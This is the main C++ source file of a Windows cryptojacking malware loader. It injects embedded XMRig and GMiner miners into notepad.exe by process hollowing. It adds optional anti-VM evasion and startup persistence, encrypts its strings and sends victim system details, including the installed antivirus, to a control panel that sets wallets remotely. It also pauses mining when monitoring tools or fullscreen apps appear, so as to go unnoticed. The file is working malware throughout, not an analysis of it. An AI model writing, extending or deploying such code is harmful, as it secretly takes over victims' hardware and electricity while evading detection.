#include <windows.h>

#include <iostream>
#include <stdio.h>
#include <csignal>

#include "../include/ntddk.h"
#include "../include/kernel32_undoc.h"
#include "../include/util.h"

#include "../include/pe_hdrs_helper.h"
#include "../include/hollowing_parts.h"
#include "../include/delete_pending_file.h"
#include "../include/http_client.h"
#include "../include/json_printer.h"
#include "../include/config_manager.h"
#include "../include/encryption.h"
#include "../include/embedded_resource.h"
#include "../src/inject_core.cpp"

#ifdef ENABLE_ANTIVM
#include "../include/antivm.h"
#endif

#ifdef ENABLE_PERSISTENCE
#include "../include/persistence.h"
#endif

// Global variables for signal handling
static DWORD g_cpuMinerPid = 0;
static DWORD g_gpuMinerPid = 0;
static HANDLE g_cpuMinerProcess = NULL;
static HANDLE g_gpuMinerProcess = NULL;
static bool g_lastCpuIdleStatus = false;  // Track last idle status to detect changes

// Signal handler for graceful shutdown
BOOL WINAPI ConsoleHandler(DWORD signal) {
    if (signal == CTRL_C_EVENT || signal == CTRL_BREAK_EVENT || 
        signal == CTRL_CLOSE_EVENT || signal == CTRL_SHUTDOWN_EVENT) {
#ifdef _DEBUG
        std::cout << "[!] Signal received, terminating miner processes..." << std::endl;
#endif
        
        if (g_cpuMinerProcess != NULL) {
            TerminateProcess(g_cpuMinerProcess, 0);
            CloseHandle(g_cpuMinerProcess);
        }
        
        if (g_gpuMinerProcess != NULL) {
            TerminateProcess(g_gpuMinerProcess, 0);
            CloseHandle(g_gpuMinerProcess);
        }
        
        return TRUE;
    }
    return FALSE;
}

int main(int argc, char *argv[])
{
    // Check if another instance is already running
    if (IsAnotherInstanceRunning("Global\\CMM")) {
#ifdef _DEBUG
        std::cerr << "[!] Another instance is already running. Exiting." << std::endl;
#endif
        return 0;
    }

    // Register signal handler to cleanup miner process on termination
    if (!SetConsoleCtrlHandler(ConsoleHandler, TRUE)) {
#ifdef _DEBUG
        std::cerr << "[-] Failed to set console control handler" << std::endl;
#endif
    }

#ifdef ENABLE_ANTIVM
    // Run anti-VM detection
    auto vmResult = AntiVM::DetectVM();
    if (vmResult.first) {
#ifdef _DEBUG
        std::cerr << "[!] VM/Sandbox detected: " << vmResult.second << std::endl;
#endif
        // Exit silently in release mode to avoid detection
        return 0;
    }
#ifdef _DEBUG
    std::cout << "[+] Anti-VM check passed: " << vmResult.second << std::endl;
#endif
#endif

#ifdef ENABLE_PERSISTENCE
    // Add to startup for persistence
    if (Persistence::AddToStartup()) {
#ifdef _DEBUG
        std::cout << "[+] Successfully added to startup" << std::endl;
#endif
    } else {
#ifdef _DEBUG
        std::cerr << "[-] Failed to add to startup" << std::endl;
#endif
    }
#endif

    std::string panelUrlsStr = ENCRYPT_STR("http://127.0.0.1:8080/api/miners/submit");
    
    // Pre-encrypt common GPU mining argument strings to stay under 16 encryption limit
    const std::string GMINER_ALGO = ENCRYPT_STR("--algo ");
    const std::string GMINER_SERVER = ENCRYPT_STR(" --server ");
    const std::string GMINER_USER = ENCRYPT_STR(" --user ");
    const std::string GMINER_DOT = ENCRYPT_STR(".");
    const std::string GMINER_FAN = ENCRYPT_STR(" --fan ");
    const std::string GMINER_SSL = ENCRYPT_STR(" --ssl");
    const std::string GMINER_TAIL = ENCRYPT_STR(" --templimit 95 --api 10050 -w 0");
    
#ifdef _DEBUG
    std::cout << "[DEBUG] Decrypted URL(s): " << panelUrlsStr << std::endl;
#endif
    
    // Get system information
    std::string pcUsername = GetWindowsUsername();
    std::string deviceHash = GetComputerHash();
    std::string cpuName = GetCPUName();
    std::string gpuName = GetGPUName();
    std::string antivirusName = GetAntivirusName();
    
#ifdef _DEBUG
    std::cout << "[*] System Information:" << std::endl;
    std::cout << "    Username: " << pcUsername << std::endl;
    std::cout << "    Device Hash: " << deviceHash << std::endl;
    std::cout << "    CPU: " << cpuName << std::endl;
    std::cout << "    GPU: " << gpuName << std::endl;
    std::cout << "    Antivirus: " << antivirusName << std::endl;
#endif
    
    // Initialize config manager
    ConfigManager configManager;
    
    // Fetch configuration from panel(s) with fallback support
#ifdef _DEBUG
    std::cout << "[*] Fetching configuration from panel..." << std::endl;
#endif
    if (!configManager.FetchConfigFromPanelWithFallback(panelUrlsStr, pcUsername, deviceHash, cpuName, gpuName, antivirusName, 0.0, 0.0, GetSystemUptimeMinutes())) {
        std::cerr << "[-] Failed to fetch configuration from all panel URLs. Exiting." << std::endl;
        return 1;
    }
    
    const MinerConfig& cpuConfig = configManager.GetCPUConfig();
    const MinerConfig& gpuConfig = configManager.GetGPUConfig();
    
    // Verify we have valid configurations
    if (cpuConfig.mining_url.empty() && gpuConfig.mining_url.empty()) {
        std::cerr << "[-] No valid mining configuration received from panel. Exiting." << std::endl;
        return 1;
    }
    
    const bool is32bit = false;

    // Create mutable buffers for both miners
    wchar_t payloadPath[MAX_PATH] = {0};
    wchar_t targetPath[MAX_PATH] = L"C:\\Windows\\system32\\notepad.exe";

    // Load XMRig miner from embedded resource
    size_t xmrigPayloadSize = 0;
    BYTE *xmrigBuf = nullptr;
    
    try {
        LoadEmbeddedXMRig(xmrigBuf, xmrigPayloadSize);
    } catch (const std::exception& e) {
        std::cerr << "[-] Failed to load XMRig from resources: " << e.what() << std::endl;
        return -1;
    }

#ifdef _DEBUG
    std::cout << "[+] Loaded XMRig payload: " << xmrigPayloadSize << " bytes" << std::endl;
#endif

    // Load GMiner from embedded resource
    size_t gminerPayloadSize = 0;
    BYTE *gminerBuf = nullptr;
    
    try {
        LoadEmbeddedGminer(gminerBuf, gminerPayloadSize);
    } catch (const std::exception& e) {
        std::cerr << "[-] Failed to load GMiner from resources: " << e.what() << std::endl;
        gminerBuf = nullptr;
        gminerPayloadSize = 0;
    }

#ifdef _DEBUG
    std::cout << "[+] Loaded GMiner payload: " << gminerPayloadSize << " bytes" << std::endl;
#endif

    // Build command line arguments for CPU
    std::cout << "[*] Checking if device is idle (threshold: " << cpuConfig.wait_time_idle << " minutes)..." << std::endl;
    bool cpuIsIdle = IsDeviceIdle(cpuConfig.wait_time_idle);
    std::string cpuCommand = configManager.BuildCommandLineArgs(cpuConfig, cpuIsIdle);
    
    if (cpuCommand.empty()) {
        std::cerr << "[-] Failed to build CPU command line arguments" << std::endl;
    }
    
    // Store the initial config to detect changes
    MinerConfig lastCpuConfig = cpuConfig;
    MinerConfig lastGpuConfig = gpuConfig;
    
#ifdef _DEBUG
    std::cout << "[+] CPU Command: " << cpuCommand << std::endl;
#endif

    // Launch miners independently
    DWORD cpuPid = 0;
    std::optional<PROCESS_INFORMATION> cpuPi;
    
    // Only launch XMRig if CPU mining is enabled
    if (cpuConfig.enabled == 1 && !cpuCommand.empty()) {
        cpuPid = transacted_hollowing(targetPath, xmrigBuf, (DWORD)xmrigPayloadSize, StringToLPWSTR(cpuCommand));
        cpuPi = ProcessStorage::GetProcess(cpuPid);
        if (cpuPid != 0) {
#ifdef _DEBUG
            std::cout << "[+] Launched XMRig (CPU) into PID: " << cpuPid << std::endl;
#endif
        } else {
            std::cerr << "[-] XMRig injection failed!" << std::endl;
            free_buffer(xmrigBuf);
            return 1;
        }
    } else {
        std::cout << "[*] CPU mining disabled, skipping XMRig injection" << std::endl;
        free_buffer(xmrigBuf);
    }

    DWORD gpuPid = 0;
    std::optional<PROCESS_INFORMATION> gpuPi;
    
    if (gminerBuf != nullptr && gminerPayloadSize > 0)
    {
        // Only launch GMiner if GPU mining is enabled
        if (gpuConfig.enabled == 1) {
            // Build gminer arguments from GPU config
            std::string gminer_args = GMINER_ALGO + gpuConfig.algo + 
                                      GMINER_SERVER + gpuConfig.mining_url + 
                                      GMINER_USER + gpuConfig.wallet + GMINER_DOT + gpuConfig.password +
                                      GMINER_FAN + std::to_string(gpuConfig.fan_speed);
            if (gpuConfig.use_ssl == 1) {
                gminer_args += GMINER_SSL;
            }
            gminer_args += GMINER_TAIL;
            
#ifdef _DEBUG
            std::cout << "[+] GMiner payload size: " << gminerPayloadSize << " bytes" << std::endl;
            std::cout << "[+] GMiner arguments: " << gminer_args << std::endl;
#endif
            
            gpuPid = transacted_hollowing(targetPath, gminerBuf, (DWORD)gminerPayloadSize, StringToLPWSTR(gminer_args));
            gpuPi = ProcessStorage::GetProcess(gpuPid);
            
            if (gpuPid != 0) {
#ifdef _DEBUG
                std::cout << "[+] Launched GMiner (GPU) into PID: " << gpuPid << std::endl;
#endif
            } else {
                std::cerr << "[-] GMiner injection failed!" << std::endl;
            }
        } else {
            std::cout << "[*] GPU mining disabled, skipping GMiner injection" << std::endl;
            free_buffer(gminerBuf);
        }
    } else {
        std::cerr << "[-] Failed to load gminer!" << std::endl;
    }

    // Store global PIDs and handles for signal handler
    g_cpuMinerPid = cpuPid;
    g_gpuMinerPid = gpuPid;
    if (cpuPi) g_cpuMinerProcess = cpuPi->hProcess;
    if (gpuPi) g_gpuMinerProcess = gpuPi->hProcess;
    int checkInCounter = 0;
    const int CHECK_IN_INTERVAL = 1; // seconds

    while (true)
    {
        // Check in with panel every 5 seconds to update hashrate
        checkInCounter++;
        if (checkInCounter >= CHECK_IN_INTERVAL)
        {
            checkInCounter = 0;
            double cpuHashrate = 0.0;
            double gpuHashrate = 0.0;
            
            // Get hashrate from appropriate miner(s)
            if (cpuPid != 0 && IsPidRunning(cpuPid)) {
                cpuHashrate = GetMinerHashrate();
            }
            if (gpuPid != 0 && IsPidRunning(gpuPid)) {
                gpuHashrate = GetGPUMinerHashrate();
            }
            
            if (cpuHashrate >= 0 || gpuHashrate >= 0) {
#ifdef _DEBUG
                std::cout << "[*] Sending hashrate update to panel: CPU=" << cpuHashrate << " H/s, GPU=" << gpuHashrate << " H/s" << std::endl;
#endif
                
                // Fetch config and check for changes
                if (configManager.FetchConfigFromPanelWithFallback(panelUrlsStr, pcUsername, deviceHash, cpuName, gpuName, antivirusName, cpuHashrate, gpuHashrate, GetSystemUptimeMinutes())) {
                    const MinerConfig& newCpuConfig = configManager.GetCPUConfig();
                    const MinerConfig& newGpuConfig = configManager.GetGPUConfig();
                    
                    // Check if CPU config has changed
                    bool cpuConfigChanged = (newCpuConfig.mining_url != lastCpuConfig.mining_url ||
                                            newCpuConfig.wallet != lastCpuConfig.wallet ||
                                            newCpuConfig.password != lastCpuConfig.password ||
                                            newCpuConfig.non_idle_usage != lastCpuConfig.non_idle_usage ||
                                            newCpuConfig.idle_usage != lastCpuConfig.idle_usage ||
                                            newCpuConfig.enabled != lastCpuConfig.enabled);
                    
                    // Check if GPU config has changed
                    bool gpuConfigChanged = (newGpuConfig.mining_url != lastGpuConfig.mining_url ||
                                            newGpuConfig.wallet != lastGpuConfig.wallet ||
                                            newGpuConfig.password != lastGpuConfig.password ||
                                            newGpuConfig.non_idle_usage != lastGpuConfig.non_idle_usage ||
                                            newGpuConfig.idle_usage != lastGpuConfig.idle_usage ||
                                            newGpuConfig.enabled != lastGpuConfig.enabled);
                    
                    // Handle CPU config change
                    if (cpuConfigChanged) {
#ifdef _DEBUG
                        std::cout << "[!] CPU config changed on server" << std::endl;
#endif
                        
                        lastCpuConfig = newCpuConfig;
                        
                        // Kill CPU miner if it's running
                        if (cpuPi) {
                            TerminateProcess(cpuPi.value().hProcess, 0);
                            WaitForSingleObject(cpuPi.value().hProcess, INFINITE);
                            cpuPid = 0;
                            cpuPi.reset();
                        }
                        
                        // Restart CPU miner if enabled
                        if (newCpuConfig.enabled == 1) {
                            bool newCpuIsIdle = IsDeviceIdle(newCpuConfig.wait_time_idle);
                            std::string newCpuCommand = configManager.BuildCommandLineArgs(newCpuConfig, newCpuIsIdle);
                            
                            cpuPid = transacted_hollowing(targetPath, xmrigBuf, (DWORD)xmrigPayloadSize, StringToLPWSTR(newCpuCommand));
                            cpuPi = ProcessStorage::GetProcess(cpuPid);
#ifdef _DEBUG
                            std::cout << "[+] CPU miner restarted with new config. New PID: " << cpuPid << std::endl;
#endif
                        } else {
#ifdef _DEBUG
                            std::cout << "[*] CPU mining disabled in new config, keeping it stopped" << std::endl;
#endif
                        }
                    }
                    
                    // Handle GPU config change
                    if (gpuConfigChanged) {
#ifdef _DEBUG
                        std::cout << "[!] GPU config changed on server" << std::endl;
#endif
                        
                        lastGpuConfig = newGpuConfig;
                        
                        // Kill GPU miner if it's running
                        if (gpuPi) {
                            TerminateProcess(gpuPi.value().hProcess, 0);
                            WaitForSingleObject(gpuPi.value().hProcess, INFINITE);
                            gpuPid = 0;
                            gpuPi.reset();
                        }
                        
                        // Restart GPU miner if enabled
                        if (newGpuConfig.enabled == 1 && gminerBuf != nullptr && gminerPayloadSize > 0) {
                            std::string gminer_args = GMINER_ALGO + newGpuConfig.algo + 
                                                      GMINER_SERVER + newGpuConfig.mining_url + 
                                                      GMINER_USER + newGpuConfig.wallet + GMINER_DOT + newGpuConfig.password +
                                                      GMINER_FAN + std::to_string(newGpuConfig.fan_speed);
                            if (newGpuConfig.use_ssl == 1) {
                                gminer_args += GMINER_SSL;
                            }
                            gminer_args += GMINER_TAIL;
                            
                            gpuPid = transacted_hollowing(targetPath, gminerBuf, (DWORD)gminerPayloadSize, StringToLPWSTR(gminer_args));
                            gpuPi = ProcessStorage::GetProcess(gpuPid);
#ifdef _DEBUG
                            std::cout << "[+] GPU miner restarted with new config. New PID: " << gpuPid << std::endl;
#endif
                        } else {
#ifdef _DEBUG
                            std::cout << "[*] GPU mining disabled in new config, keeping it stopped" << std::endl;
#endif
                        }
                    }
                }
            }
        }

        // Monitor CPU miner process
        if (cpuPid != 0) {
            // Check idle status continuously (not just on crash)
            bool cpuIsIdle = IsDeviceIdle(lastCpuConfig.wait_time_idle);
            
            // If idle status changed, restart the miner with updated CPU usage
            if (cpuIsIdle != g_lastCpuIdleStatus) {
#ifdef _DEBUG
                std::cout << "[*] CPU idle status changed from " << (g_lastCpuIdleStatus ? "IDLE" : "BUSY") << " to " << (cpuIsIdle ? "IDLE" : "BUSY") << ", restarting miner..." << std::endl;
#endif
                g_lastCpuIdleStatus = cpuIsIdle;
                
                if (cpuPi) {
                    TerminateProcess(cpuPi.value().hProcess, 0);
                    WaitForSingleObject(cpuPi.value().hProcess, INFINITE);
                    CloseHandle(cpuPi.value().hProcess);
                    CloseHandle(cpuPi.value().hThread);
                    cpuPi.reset();
                    cpuPid = 0;
                }
                
                // Restart with new idle status if CPU is enabled
                if (lastCpuConfig.enabled == 1 && xmrigBuf != nullptr && xmrigPayloadSize > 0) {
                    std::string cpuCommand = configManager.BuildCommandLineArgs(lastCpuConfig, cpuIsIdle);
                    cpuPid = transacted_hollowing(targetPath, xmrigBuf, (DWORD)xmrigPayloadSize, StringToLPWSTR(cpuCommand));
                    cpuPi = ProcessStorage::GetProcess(cpuPid);
#ifdef _DEBUG
                    std::cout << "[+] CPU miner restarted with " << (cpuIsIdle ? "IDLE" : "BUSY") << " settings. New PID: " << cpuPid << std::endl;
#endif
                }
            } else if (!IsPidRunning(cpuPid)) {
#ifdef _DEBUG
                std::cout << "[!] CPU miner process (PID " << cpuPid << ") is NOT running." << std::endl;
#endif
                // Restart if CPU is still enabled
                if (lastCpuConfig.enabled == 1) {
                    std::string cpuCommand = configManager.BuildCommandLineArgs(lastCpuConfig, cpuIsIdle);
                    cpuPid = transacted_hollowing(targetPath, xmrigBuf, (DWORD)xmrigPayloadSize, StringToLPWSTR(cpuCommand));
                    cpuPi = ProcessStorage::GetProcess(cpuPid);
                }
            } else {
#ifdef _DEBUG
                std::cout << "[+] CPU miner process (PID " << cpuPid << ") is running" << std::endl;
#endif
                // Handle process suspension based on monitoring
                if (AreProcessesRunning(processNames)) {
                    NtSuspendProcess(cpuPi.value().hProcess);
                } else if (IsForegroundWindowFullscreen()) {
                    NtSuspendProcess(cpuPi.value().hProcess);
                } else {
                    NtResumeProcess(cpuPi.value().hProcess);
                }
            }
        }

        // Monitor GPU miner process
        if (gpuPid != 0) {
            if (!IsPidRunning(gpuPid)) {
#ifdef _DEBUG
                std::cout << "[!] GPU miner process (PID " << gpuPid << ") is NOT running." << std::endl;
#endif
                // Restart if GPU is still enabled
                if (lastGpuConfig.enabled == 1 && gminerBuf != nullptr && gminerPayloadSize > 0) {
                    std::string gminer_args = GMINER_ALGO + lastGpuConfig.algo + 
                                              GMINER_SERVER + lastGpuConfig.mining_url + 
                                              GMINER_USER + lastGpuConfig.wallet + GMINER_DOT + lastGpuConfig.password +
                                              GMINER_FAN + std::to_string(lastGpuConfig.fan_speed);
                    if (lastGpuConfig.use_ssl == 1) {
                        gminer_args += GMINER_SSL;
                    }
                    gminer_args += GMINER_TAIL;
                    
                    gpuPid = transacted_hollowing(targetPath, gminerBuf, (DWORD)gminerPayloadSize, StringToLPWSTR(gminer_args));
                    gpuPi = ProcessStorage::GetProcess(gpuPid);
                }
            } else {
#ifdef _DEBUG
                std::cout << "[+] GPU miner process (PID " << gpuPid << ") is running" << std::endl;
#endif
                // Handle process suspension based on monitoring
                if (AreProcessesRunning(processNames)) {
                    NtSuspendProcess(gpuPi.value().hProcess);
                } else if (IsForegroundWindowFullscreen()) {
                    NtSuspendProcess(gpuPi.value().hProcess);
                } else {
                    NtResumeProcess(gpuPi.value().hProcess);
                }
            }
        }
        
        Sleep(10000);  // Check every 10 seconds
    }

    return 0;
}

// WinMain entry point for GUI subsystem (WIN32 flag)
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // Convert Windows command line to argc/argv format and call main()
    int argc = 0;
    LPWSTR* argv_w = CommandLineToArgvW(GetCommandLineW(), &argc);
    
    char** argv = new char*[argc];
    for (int i = 0; i < argc; i++) {
        int size = WideCharToMultiByte(CP_UTF8, 0, argv_w[i], -1, NULL, 0, NULL, NULL);
        argv[i] = new char[size];
        WideCharToMultiByte(CP_UTF8, 0, argv_w[i], -1, argv[i], size, NULL, NULL);
    }
    
    int result = main(argc, argv);
    
    // Cleanup
    for (int i = 0; i < argc; i++) {
        delete[] argv[i];
    }
    delete[] argv;
    LocalFree(argv_w);
    
    return result;
}

